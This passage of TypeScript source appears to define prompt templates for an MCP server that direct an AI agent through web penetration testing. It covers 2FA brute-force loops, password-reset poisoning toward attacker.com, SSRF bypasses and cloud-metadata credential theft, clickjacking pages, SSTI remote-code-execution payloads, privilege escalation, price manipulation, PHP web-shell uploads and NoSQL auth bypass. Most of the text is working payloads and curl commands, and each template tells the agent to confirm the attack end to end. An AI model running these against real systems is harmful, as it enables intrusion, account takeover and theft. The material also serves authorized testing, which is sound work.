for code in $(seq -w 0000 9999); do
  curl -sk -X POST "${target_url}/login2" -d "mfa-code=$code" -b "session=..." -w "%{http_code}" -o /dev/null
done
\`\`\`

### 3c. Verify cookie manipulation
After completing 2FA on YOUR account, check if the "verify" cookie or session parameter can be applied to another user's pre-2FA session.

### 3d. 2FA code reuse
Check if a valid 2FA code can be reused multiple times (should be single-use).

## Step 4: Cookie-Based Authentication Attacks

### 4a. Cookie format analysis
Run \`auth_cookie_tamper("${target_url}")\` to analyze and manipulate session cookies.

### 4b. Base64:MD5 cookie cracking
If the cookie is base64-encoded and contains an MD5 hash (e.g., \`dXNlcjoxMjNxd2U=\` decodes to \`user:123qwe\`):
1. Base64 decode the cookie value.
2. Identify the hash format (MD5 = 32 hex chars).
3. Crack with hashcat: \`hashcat -m 0 hash.txt rockyou.txt\`
4. Forge a cookie for another user with their password hash.

### 4c. Predictable session tokens
Check if session IDs are sequential, timestamp-based, or use weak randomness.

## Step 5: Password Reset Poisoning

### 5a. X-Forwarded-Host injection
\`\`\`
curl -sk -X POST "${target_url}/forgot-password" \\
  -H "X-Forwarded-Host: attacker.com" \\
  -d "email=victim@example.com"
\`\`\`
If the reset email uses the Host header to construct the reset link, the victim receives a link pointing to attacker.com, leaking the reset token.

### 5b. Host header injection
\`\`\`
curl -sk -X POST "${target_url}/forgot-password" \\
  -H "Host: attacker.com" \\
  -d "email=victim@example.com"
\`\`\`

### 5c. Double Host header
Some proxies pass the second Host header to the backend:
\`\`\`
curl -sk -X POST "${target_url}/forgot-password" \\
  -H "Host: target.com" \\
  -H "Host: attacker.com" \\
  -d "email=victim@example.com"
\`\`\`

## Step 6: Verification
For every finding:
1. Confirm the attack works end-to-end (not just a different error message).
2. For brute-force: Actually log in with found credentials.
3. For 2FA bypass: Access the authenticated dashboard.
4. For password reset: Receive the poisoned link and confirm the token is present.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 12. ssrf_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "ssrf_methodology",
    "Complete SSRF testing methodology — deny list bypass, allow list bypass, cloud metadata, DNS rebinding, XXE-to-SSRF.",
    {
      target_url: z.string().describe("Target URL that accepts a URL/host parameter"),
      parameter: z.string().describe("Parameter name that accepts URLs (e.g., 'url', 'src', 'redirect', 'stockApi')"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# SSRF Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Basic SSRF Detection
1. Run \`ssrf_test("${target_url}", "${parameter}")\` — Tests localhost bypass variants.
2. Run \`ssrf_cloud_metadata("${target_url}", "${parameter}")\` — Tests cloud metadata access.

## Step 2: Deny List Bypass (All IP Variants)
If direct localhost/127.0.0.1 is blocked:
\`\`\`
# Standard variants
127.0.0.1, localhost, 0, 0.0.0.0, 127.1

# Decimal representation
2130706433  (= 127*256^3 + 0*256^2 + 0*256 + 1)

# Hex representation
0x7f000001

# Octal representation
017700000001, 0177.0.0.01

# IPv6
[::1], [0000:0000:0000:0000:0000:0000:0000:0001], [::ffff:127.0.0.1]

# Short IPv6
[::1], [0:0:0:0:0:0:0:1]

# DNS resolution to localhost
127.0.0.1.nip.io, spoofed.burpcollaborator.net (configure to resolve to 127.0.0.1)
\`\`\`

### Combined IP + keyword double-URL-encoding
If a WAF blocks both IP patterns AND keywords like "localhost":
\`\`\`
# Double-encode the IP in URL format
http://%25%31%32%37%25%32%65%25%30%25%32%65%25%30%25%32%65%25%31/admin

# Double-encode "localhost"
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34/admin
\`\`\`

## Step 3: Allow List Bypass
If the server only allows specific domains:

### URL parsing tricks
\`\`\`
# @ credential trick: Browser/parser reads host after @
http://allowed-domain@attacker.com/
http://allowed-domain%40attacker.com/

# Fragment trick
http://attacker.com#allowed-domain

# Subdomain of allowed domain
http://attacker.allowed-domain.com

# URL encoding in hostname
http://allowed-domain%252F@attacker.com
\`\`\`

### Double URL-encoding # with @ credentials (whitelist bypass)
\`\`\`
# Double-encode # as %2523 to confuse URL parsers
http://allowed-host%2523@127.0.0.1/admin

# Decoding chain: %2523 -> %23 (first decode) -> # (second decode)
# Allow list sees "allowed-host" in URL and passes
# Back-end fetcher resolves to 127.0.0.1/admin after double decode
\`\`\`
Combine \`@\` (credentials separator) + \`%2523\` (double-encoded \`#\`) + fragment injection. The allow list check passes because the allowed hostname appears in the URL, but after double URL-decoding the \`#\` turns the allowed portion into a fragment, and the actual host resolves to the attacker-controlled address (or localhost).

## Step 4: Open Redirect Chaining
If the target has an open redirect on the allowed domain, chain it:
\`\`\`
# Find an open redirect first
https://allowed-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Use it as the SSRF payload
${parameter}=https://allowed-domain.com/redirect?url=http://169.254.169.254/
\`\`\`

## Step 5: DNS Rebinding
1. Set up a DNS server that alternates between returning the allowed IP and 127.0.0.1.
2. Submit the rebinding domain: \`${parameter}=http://rebind.attacker.com/admin\`
3. First resolution passes the allow check. Second resolution (when the server fetches) resolves to 127.0.0.1.
Use services like rebind.it or rbndr.us to generate rebinding domains.

## Step 6: Cloud Metadata Access
Each cloud provider has different metadata endpoints:

### AWS (IMDSv1 — no token needed)
\`\`\`
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
\`\`\`

### AWS (IMDSv2 — requires token via PUT)
IMDSv2 is harder because it requires a PUT request to get a token first. SSRF via GET alone won't work.

### Google Cloud
\`\`\`
http://metadata.google.internal/computeMetadata/v1/
\`\`\`
IMPORTANT: Requires header \`Metadata-Flavor: Google\` — SSRF must allow custom headers or find a way to inject this header.

### Azure
\`\`\`
http://169.254.169.254/metadata/instance?api-version=2021-02-01
\`\`\`
Requires header \`Metadata: true\`.

## Step 7: XXE-to-SSRF
If the application processes XML input:
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<productId>&xxe;</productId>
\`\`\`

### XInclude injection (when you control only part of the XML)
\`\`\`xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>
\`\`\`

## Step 8: Vulnerable Parameter Checklist
Parameters commonly vulnerable to SSRF:
- \`url\`, \`uri\`, \`src\`, \`source\`, \`href\`
- \`redirect\`, \`redirect_url\`, \`return_url\`, \`next\`
- \`stockApi\`, \`api_url\`, \`webhook_url\`, \`callback\`
- \`img\`, \`image_url\`, \`avatar_url\`, \`icon_url\`
- \`proxy\`, \`forward\`, \`fetch\`, \`load\`
- \`pdf_url\`, \`export_url\`, \`file\`

## Verification
For each successful SSRF:
1. Confirm you can read internal resources (not just get a 200 status).
2. Check if the response body is reflected back to you (full SSRF vs blind SSRF).
3. For blind SSRF: use out-of-band detection (Burp Collaborator, webhook.site).
4. Document the bypass technique and the internal resources accessible.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 13. clickjacking_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "clickjacking_methodology",
    "Clickjacking testing methodology — iframe overlay, form prefill, frame buster bypass, multistep attacks.",
    {
      target_url: z.string().describe("Target URL of a sensitive action page (e.g., account settings, admin panel)"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Clickjacking Testing Methodology

**Target:** ${target_url}

## Step 1: Check Framing Protections
1. Run \`clickjacking_test("${target_url}")\` — Checks X-Frame-Options and CSP frame-ancestors headers.
2. Manually verify:
   \`curl -sk -D - -o /dev/null "${target_url}" | grep -i "x-frame-options\\|content-security-policy"\`
3. If X-Frame-Options is DENY or SAMEORIGIN, or CSP has \`frame-ancestors 'self'\`, the page is protected.
4. If NEITHER header is present, the page is vulnerable to clickjacking.

## Step 2: Basic Iframe Overlay PoC
\`\`\`html
<html>
<head><title>Click to win a prize!</title></head>
<body>
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;  /* Nearly invisible */
    z-index: 2;
  }
  .decoy {
    position: absolute;
    top: 300px;  /* Adjust to align with target button */
    left: 100px;
    z-index: 1;
    font-size: 24px;
    cursor: pointer;
  }
</style>
<div class="decoy">Click here to claim your prize!</div>
<iframe src="${target_url}"></iframe>
</body>
</html>
\`\`\`

## Step 3: Form Prefilling via URL Parameters
If the target page has forms that accept URL parameters to pre-populate fields:
\`\`\`html
<iframe src="${target_url}?email=attacker@evil.com"></iframe>
\`\`\`
Combined with clickjacking, the victim clicks "Submit" on a pre-filled form they can't see.

## Step 4: Frame Buster Bypass
If the page has frame-busting JavaScript (e.g., \`if (top !== self) top.location = self.location\`):

### 4a. Sandbox attribute bypass
\`\`\`html
<iframe src="${target_url}" sandbox="allow-forms allow-scripts"></iframe>
\`\`\`
The \`sandbox\` attribute without \`allow-top-navigation\` prevents the frame-busting script from navigating the top window. The form still works because \`allow-forms\` is set.

Run \`frame_buster_bypass("${target_url}")\` for automated testing.

### 4b. Double framing
\`\`\`html
<iframe src="outer.html"></iframe>
<!-- outer.html contains: <iframe src="${target_url}"></iframe> -->
\`\`\`
Some frame busters only check \`parent\` vs \`self\`, not \`top\` vs \`self\`.

## Step 5: Clickjacking + DOM XSS Combo
If the target page has a DOM XSS that requires user interaction (e.g., clicking a link):
1. Craft the URL with the XSS payload: \`${target_url}#<img src=x onerror=alert(1)>\`
2. Load it in a transparent iframe.
3. Position the decoy button over the element that triggers the DOM XSS.
The victim clicks the decoy, triggering the XSS in the target's context.

## Step 6: Multistep Clickjacking
For actions requiring multiple clicks (e.g., "Delete account" -> "Are you sure?" -> "Confirm"):
\`\`\`html
<style>
  iframe { position: relative; width: 700px; height: 500px; opacity: 0.0001; z-index: 2; }
  .step1, .step2, .step3 { position: absolute; z-index: 1; font-size: 20px; cursor: pointer; }
  .step1 { top: 300px; left: 100px; }
  .step2 { top: 400px; left: 200px; display: none; }
  .step3 { top: 350px; left: 150px; display: none; }
</style>

<div class="step1" onclick="this.style.display='none'; document.querySelector('.step2').style.display='block';">
  Step 1: Click here to continue
</div>
<div class="step2" onclick="this.style.display='none'; document.querySelector('.step3').style.display='block';">
  Step 2: Click to verify
</div>
<div class="step3">
  Step 3: Click to confirm
</div>
<iframe src="${target_url}"></iframe>
\`\`\`
Each decoy button aligns with the corresponding confirmation button in the framed page.

## Verification
1. Host the PoC HTML on a different origin (e.g., \`python3 -m http.server 8080\`).
2. Open the PoC in a browser while authenticated to the target site.
3. Click the decoy button — if the action executes in the iframe, clickjacking is confirmed.
4. Record a screen capture or document the exact button positions for the report.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 14. ssti_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "ssti_methodology",
    "Server-Side Template Injection testing — detection, engine fingerprinting, and exploitation payloads for Jinja2, ERB, Tornado, Freemarker, Handlebars, Django.",
    {
      target_url: z.string().describe("Target URL to test"),
      parameter: z.string().describe("Parameter name that may be rendered in a server-side template"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# SSTI Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Detection
Inject mathematical expressions in common template syntaxes:
\`\`\`
${parameter}={{7*7}}          → If "49" appears in response, SSTI confirmed.
${parameter}=\${7*7}          → Alternative syntax (e.g., Freemarker, Mako).
${parameter}=<%= 7*7 %>       → ERB (Ruby) syntax.
${parameter}={{7*'7'}}        → Differentiator (see Step 2).
${parameter}=#{7*7}           → Slim / embedded Ruby.
\`\`\`
Test each syntax separately. Check the response for "49" or "7777777" to confirm injection AND identify the engine.

## Step 2: Engine Fingerprinting
Use the response to \`{{7*'7'}}\` to differentiate engines:
- **49** → Twig (PHP) or Jinja2 with numeric coercion
- **7777777** → Jinja2 (Python) — string multiplication
- **Error** → Neither, try other syntaxes
- **Blank/filtered** → Try URL-encoded or alternative delimiters

Decision tree:
\`\`\`
{{7*7}} = 49?
  ├── YES → {{7*'7'}} = 7777777?
  │         ├── YES → Jinja2 / Twig
  │         └── NO (49) → Twig
  └── NO → \${7*7} = 49?
           ├── YES → Freemarker / Mako / Thymeleaf
           └── NO → <%= 7*7 %> = 49?
                    ├── YES → ERB
                    └── NO → Try other syntaxes
\`\`\`

## Step 3: Exploitation by Engine

### Jinja2 (Python — Flask, Django with Jinja2)
\`\`\`
# Read config
{{config}}
{{config.items()}}

# RCE via MRO traversal
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[INDEX_OF_POPEN]('id',shell=True,stdout=-1).communicate()}}

# Simplified (find Popen index first)
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='Popen' %}{{c('id',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}

# Direct OS access if available
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
\`\`\`

### ERB (Ruby — Rails)
\`\`\`
# Basic RCE
<%= system("id") %>
<%= \`id\` %>
<%= IO.popen("id").read() %>

# File read
<%= File.open("/etc/passwd").read() %>
\`\`\`

### Tornado (Python)
\`\`\`
# Import and execute
{% import os %}{{os.popen("id").read()}}
{% import subprocess %}{{subprocess.check_output("id",shell=True)}}
\`\`\`

### Freemarker (Java)
\`\`\`
# Execute class
\${"freemarker.template.utility.Execute"?new()("id")}

# Object builder
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}

# Read file
\${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(",")}
\`\`\`

### Handlebars (JavaScript — Node.js)
\`\`\`
# RCE via prototype lookup
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
\`\`\`

### Django (Python — if using Django templates, not Jinja2)
Django's default template engine is sandboxed. Direct RCE is typically not possible, but information disclosure is:
\`\`\`
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{debug}}
\`\`\`

### Thymeleaf (Java — Spring Boot)
\`\`\`
# SpEL injection in URL fragment
__\${T(java.lang.Runtime).getRuntime().exec("id")}__
\`\`\`

## Step 4: WAF Bypass / Filter Evasion
If common template syntax is filtered:
- URL encode: \`%7B%7B7*7%7D%7D\`
- Double URL encode: \`%257B%257B7*7%257D%257D\`
- Use alternative delimiters: \`{%25+import+os+%25}{{os.popen('id').read()}}\`
- Unicode escapes: \`\\u007B\\u007B7*7\\u007D\\u007D\`

## Verification
1. Start with detection (mathematical expressions) — this is safe.
2. For confirmed SSTI, attempt to read a known file (e.g., /etc/hostname) rather than running destructive commands.
3. Document the template engine, the injection point, and the exact payload that achieved code execution.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 15. access_control_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "access_control_methodology",
    "Access control testing — IDOR, horizontal/vertical privilege escalation, HTTP method bypass, header-based bypass.",
    {
      target_url: z.string().describe("Target URL of the application"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Access Control Testing Methodology

**Target:** ${target_url}

## Step 1: Enumerate Access-Controlled Endpoints
1. Map all endpoints that return different data per user or role.
2. Identify admin-only endpoints (user management, settings, reports).
3. Note endpoints with ID parameters (user profiles, orders, documents).

## Step 2: IDOR Testing

### 2a. Sequential ID enumeration
Run \`idor_test("${target_url}/api/users/USER_ID", "__path__", ["1","2","3","4","5"])\`

### 2b. GUID discovery
GUIDs seem unguessable, but they leak through:
- API responses listing other users' IDs
- Chat transcripts or message histories
- Public profiles or user listings
- Predictable GUID versions (v1 GUIDs contain timestamps)
- Auto-increment IDs hidden in API responses

### 2c. Parameter pollution
Try sending the ID parameter multiple times:
\`\`\`
/api/users?id=YOUR_ID&id=VICTIM_ID
\`\`\`
Some frameworks use the last value, some use the first.

### 2d. Body vs URL parameter
If the URL contains your ID but the body has another user's ID, which takes priority?
\`\`\`
POST /api/users/YOUR_ID
Content-Type: application/json
{"user_id": "VICTIM_ID", "email": "new@email.com"}
\`\`\`

## Step 3: Horizontal Privilege Escalation
1. Log in as User A, capture session token.
2. Access User B's resources using User A's token:
   \`\`\`
   curl -sk "${target_url}/api/users/USER_B_ID/profile" -H "Cookie: session=USER_A_SESSION"
   curl -sk "${target_url}/api/users/USER_B_ID/orders" -H "Cookie: session=USER_A_SESSION"
   \`\`\`
3. Try modifying another user's data:
   \`\`\`
   curl -sk -X PUT "${target_url}/api/users/USER_B_ID" \\
     -H "Cookie: session=USER_A_SESSION" \\
     -H "Content-Type: application/json" \\
     -d '{"email":"attacker@evil.com"}'
   \`\`\`

## Step 4: Vertical Privilege Escalation

### 4a. Hidden input password disclosure
Some admin pages include the current password in a hidden form field:
\`\`\`html
<input type="hidden" name="password" value="actual_password_here">
\`\`\`
View source on any user management or profile page.

### 4b. Role modification via JSON fields
When updating your profile, add fields the frontend doesn't show:
\`\`\`
PUT /api/users/me
{"name": "Normal User", "role": "admin", "is_admin": true, "admin": 1}
\`\`\`
Run \`role_escalation_test("${target_url}")\` for automated testing.

### 4c. Cookie-based role
Run \`auth_cookie_tamper("${target_url}")\` — check if the cookie contains role information that can be modified.

### 4d. Redirect data leakage
When redirected from an admin page (e.g., 302 redirect to /login), check if the response body still contains the admin page content. The redirect happens client-side; the server may have already rendered the admin page.
\`\`\`
curl -sk "${target_url}/admin" -H "Cookie: session=NORMAL_USER_SESSION" -D - -o /tmp/admin_response.txt
# Check if /tmp/admin_response.txt contains admin page content despite 302 status
\`\`\`

## Step 5: HTTP Method Bypass

### 5a. Referer-based access control bypass
If admin pages check the Referer header:
\`\`\`
curl -sk "${target_url}/admin/delete-user?id=123" \\
  -H "Cookie: session=NORMAL_SESSION" \\
  -H "Referer: ${target_url}/admin"
\`\`\`

### 5b. X-Original-URL / X-Rewrite-URL bypass
Some reverse proxies (Nginx, IIS) use these headers to route requests:
\`\`\`
GET / HTTP/1.1
X-Original-URL: /admin/delete-user?id=123
\`\`\`
The front-end proxy checks "/", but the backend processes "/admin/delete-user".

### 5c. HTTP method switching
If POST to /admin/delete is blocked, try:
\`\`\`
curl -sk -X GET "${target_url}/admin/delete?id=123" -H "Cookie: session=NORMAL_SESSION"
curl -sk -X PATCH "${target_url}/admin/delete" -d '{"id":"123"}' -H "Cookie: session=NORMAL_SESSION"
curl -sk -X PUT "${target_url}/admin/delete" -d '{"id":"123"}' -H "Cookie: session=NORMAL_SESSION"
\`\`\`

### 5d. URL path tricks
\`\`\`
/admin → 403
/Admin → 200?
/ADMIN → 200?
/admin/ → 200?
/admin/. → 200?
/./admin → 200?
/admin%00 → 200?
/admin%20 → 200?
\`\`\`

## Verification
1. For each IDOR: Confirm you can read OR modify another user's data.
2. For privilege escalation: Confirm you can perform an admin-only action.
3. Document the exact request, the response, and what was accessed/modified.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 16. business_logic_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "business_logic_methodology",
    "Business logic vulnerability testing — price manipulation, workflow bypass, parameter tampering, state machine abuse.",
    {
      target_url: z.string().describe("Target URL of the application"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Business Logic Vulnerability Testing Methodology

**Target:** ${target_url}

## Step 1: Price and Payment Manipulation

### 1a. Client-side price manipulation
Run \`price_manipulation_test\` on checkout endpoints.
Intercept the purchase request and modify price-related fields:
\`\`\`
# Zero price
{"product_id": "premium_plan", "price": 0, "quantity": 1}

# Negative price (might credit your account)
{"product_id": "premium_plan", "price": -100, "quantity": 1}

# Negative quantity
{"product_id": "premium_plan", "price": 99.99, "quantity": -1}

# Fractional quantity
{"product_id": "premium_plan", "quantity": 0.001}
\`\`\`

### 1b. API price manipulation via different HTTP methods
\`\`\`
# Try PATCH to modify price of an existing order
curl -sk -X PATCH "${target_url}/api/orders/ORDER_ID" \\
  -H "Content-Type: application/json" -d '{"total": 0.01}'

# Try OPTIONS to discover allowed methods
curl -sk -X OPTIONS "${target_url}/api/orders/ORDER_ID" -D -
\`\`\`

### 1c. Currency/plan ID manipulation
\`\`\`
# Change to a cheaper currency
{"plan": "enterprise", "currency": "IDR"}

# Substitute a free plan's price_id for a paid plan
{"plan": "enterprise", "price_id": "price_free_tier_id"}
\`\`\`

### 1d. Verify server-side price resolution
The server should resolve prices from product/plan IDs, NOT accept client-supplied prices. Test:
\`\`\`
curl -sk -X POST "${target_url}/api/checkout" \\
  -H "Content-Type: application/json" \\
  -d '{"plan_id": "premium", "price": 1}'
\`\`\`
If the server charges $1 instead of the real price, it's trusting client-supplied values.

## Step 2: Coupon and Discount Abuse

### 2a. Coupon brute-force
Run \`coupon_abuse_test\` if the app has coupon functionality.
\`\`\`
# Common coupon patterns
TRIAL14, WELCOME, LAUNCH, BETA, FREE, DISCOUNT, VIP, PARTNER, REFERRAL
SUMMER2024, BLACKFRIDAY, NEWYEAR, EARLYBIRD
\`\`\`

### 2b. Coupon alternation / stacking
Apply coupon A, then coupon B, then A again — check if the discount compounds:
\`\`\`
POST /api/apply-coupon {"code": "COUPON_A"}  → 10% off
POST /api/apply-coupon {"code": "COUPON_B"}  → 20% off
POST /api/apply-coupon {"code": "COUPON_A"}  → another 10% off?
\`\`\`

### 2c. Reuse expired / single-use coupons
Apply a coupon, complete checkout, then try the same coupon on a new order.

## Step 3: Parameter Removal Bypass
Remove security-relevant parameters entirely from the request:
\`\`\`
# Normal request
POST /transfer {"to": "user2", "amount": 100, "limit_check": true}

# Remove the limit check
POST /transfer {"to": "user2", "amount": 100}

# Remove authentication fields
POST /api/action {"data": "value"}  (without session/token parameters)
\`\`\`
Some implementations only enforce limits when the parameter is present.

## Step 4: Workflow Bypass (Skip Steps)

### 4a. Multi-step process bypass
For multi-step processes (registration, checkout, approval):
1. Complete step 1, capture the request for step 3, submit step 3 directly.
2. Skip validation steps (email verification, phone verification, payment).
\`\`\`
# Instead of: Step1 → Step2 (validation) → Step3 (confirmation)
# Try: Step1 → Step3 directly
curl -sk -X POST "${target_url}/api/checkout/confirm" \\
  -H "Cookie: session=..." -d '{"order_id": "123"}'
\`\`\`

### 4b. State machine bypass (drop redirects)
When a server responds with a 302 redirect (e.g., redirecting to payment), the response body may already contain the success page. Use curl (which doesn't follow redirects by default) to capture the response:
\`\`\`
curl -sk -X POST "${target_url}/api/checkout" \\
  -H "Cookie: session=..." -d '{"order_id": "123"}' -D - -o /tmp/response.txt
# Check if /tmp/response.txt contains order confirmation despite 302
\`\`\`

## Step 5: Domain-Based Access Control Bypass
If features are gated by email domain (e.g., only @company.com gets admin):
\`\`\`
# Register with: user@company.com.attacker.com
# Register with: user@company.com%00@attacker.com
# Register with: user+tag@attacker.com (where +company.com is in the local part)
\`\`\`

## Step 6: Race Conditions
Exploit TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities:
\`\`\`
# Send 10 concurrent coupon redemption requests
for i in $(seq 1 10); do
  curl -sk -X POST "${target_url}/api/redeem-coupon" \\
    -H "Cookie: session=..." -d '{"code": "SINGLE_USE_CODE"}' &
done
wait
\`\`\`
If the coupon is applied multiple times, the check-and-use is not atomic.

## Verification
1. For price manipulation: Check the actual charge on the payment processor (Stripe dashboard, etc.).
2. For workflow bypass: Confirm the end state (account created, order placed, access granted).
3. For coupon abuse: Verify the discount was actually applied to the final charge.
4. Document the exact sequence of requests that reproduces the vulnerability.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 17. file_upload_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "file_upload_methodology",
    "File upload vulnerability testing — web shell upload, Content-Type bypass, extension blacklist bypass, .htaccess override.",
    {
      target_url: z.string().describe("Base URL of the target application"),
      upload_endpoint: z.string().describe("Upload endpoint path, e.g. /my-account/avatar or /api/upload"),
    },
    ({ target_url, upload_endpoint }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# File Upload Vulnerability Testing Methodology

**Target:** ${target_url}
**Upload Endpoint:** ${upload_endpoint}

## Step 1: Automated Testing
Run \`file_upload_test("${target_url}", "${upload_endpoint}")\` — Tests multiple bypass techniques automatically.

## Step 2: Content-Type Restriction Bypass
If the server blocks files based on Content-Type header:
\`\`\`
# Upload PHP shell with image/jpeg Content-Type
curl -sk -X POST "${target_url}${upload_endpoint}" \\
  -H "Cookie: session=..." \\
  -F "file=@shell.php;type=image/jpeg" \\
  -F "csrf=TOKEN"
\`\`\`
The server validates Content-Type = image/jpeg, but the file content is PHP.

## Step 3: Extension Blacklist Bypass

### 3a. Alternative PHP extensions
If .php is blocked, try:
\`\`\`
shell.php5, shell.php7, shell.phtml, shell.phar, shell.phps, shell.pHP (case variation)
\`\`\`

### 3b. Double extension
\`\`\`
shell.php.jpg    — Apache may process based on first recognized extension
shell.jpg.php    — Some servers process based on last extension
\`\`\`

### 3c. Null byte injection (older systems)
\`\`\`
shell.php%00.jpg    — URL-encoded null byte truncates at .php
shell.php\\x00.jpg   — Literal null byte
\`\`\`

### 3d. Trailing characters
\`\`\`
shell.php.       — Trailing dot
shell.php....    — Multiple trailing dots
shell.php/       — Trailing slash
shell.php;.jpg   — Semicolon (Apache on Windows)
shell.php%20     — Trailing space
\`\`\`

## Step 4: .htaccess Upload
If the server uses Apache and you can upload to a directory you control:
1. Upload a .htaccess file that maps a custom extension to PHP:
\`\`\`
# .htaccess content:
AddType application/x-httpd-php .evil
\`\`\`
2. Then upload \`shell.evil\` with PHP content — Apache will execute it as PHP.

\`\`\`
# Upload .htaccess
curl -sk -X POST "${target_url}${upload_endpoint}" \\
  -F "file=@.htaccess;filename=.htaccess" -H "Cookie: session=..."

# Upload shell with custom extension
curl -sk -X POST "${target_url}${upload_endpoint}" \\
  -F "file=@shell.evil;type=image/jpeg" -H "Cookie: session=..."
\`\`\`

## Step 5: Server-Side Validation Bypass

### 5a. Magic bytes + PHP content
Prepend valid image magic bytes to PHP content:
\`\`\`bash
# Create a polyglot file (valid JPEG header + PHP)
printf '\\xff\\xd8\\xff\\xe0' > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php
\`\`\`

### 5b. SVG with embedded script
\`\`\`xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.cookie)</script>
    </body>
  </foreignObject>
</svg>
\`\`\`

### 5c. Image with EXIF payload
\`\`\`bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
\`\`\`

## Step 6: Accessing Uploaded Files
After successful upload, find where the file is stored:
1. Check the upload response for the file URL/path.
2. Common locations: \`/files/avatars/\`, \`/uploads/\`, \`/images/\`, \`/static/uploads/\`
3. Access the file and check if it executes:
\`\`\`
curl -sk "${target_url}/files/avatars/shell.php?cmd=id"
\`\`\`

## Step 7: Path Traversal in Filename
Try to upload to a different directory:
\`\`\`
filename="../../../var/www/html/shell.php"
filename="..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php"
\`\`\`

## Verification
1. After uploading a web shell, execute a command (e.g., \`id\` or \`whoami\`) to confirm RCE.
2. For XSS via SVG/HTML: Access the uploaded file in a browser and confirm script execution.
3. Document: upload technique used, bypass method, file location, and achieved execution.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 18. nosqli_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "nosqli_methodology",
    "NoSQL injection testing — operator injection auth bypass, data extraction, JavaScript injection in MongoDB.",
    {
      target_url: z.string().describe("Target URL to test"),
      parameter: z.string().describe("Parameter name to test for NoSQL injection (e.g., 'username', 'category')"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# NoSQL Injection Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Operator Injection Detection
Run \`nosqli_detect("${target_url}", "${parameter}")\` for automated detection.

### Manual detection payloads (JSON body)
\`\`\`json
{"${parameter}": {"$ne": ""}}
{"${parameter}": {"$gt": ""}}
{"${parameter}": {"$regex": ".*"}}
{"${parameter}": {"$exists": true}}
{"${parameter}": {"$nin": ["invalid"]}}
\`\`\`

### URL parameter injection
\`\`\`
${parameter}[$ne]=1
${parameter}[$gt]=
${parameter}[$regex]=.*
${parameter}[$exists]=true
\`\`\`

## Step 2: Authentication Bypass
Run \`nosqli_auth_bypass("${target_url}")\`.

### Manual bypass payloads
\`\`\`json
// Bypass password check entirely
{"username": "admin", "password": {"$ne": ""}}

// Match any non-null password
{"username": "admin", "password": {"$ne": null}}

// Match password starting with any character
{"username": "admin", "password": {"$gt": ""}}

// Regex match anything
{"username": "admin", "password": {"$regex": ".*"}}

// Bypass both username AND password
{"username": {"$ne": ""}, "password": {"$ne": ""}}
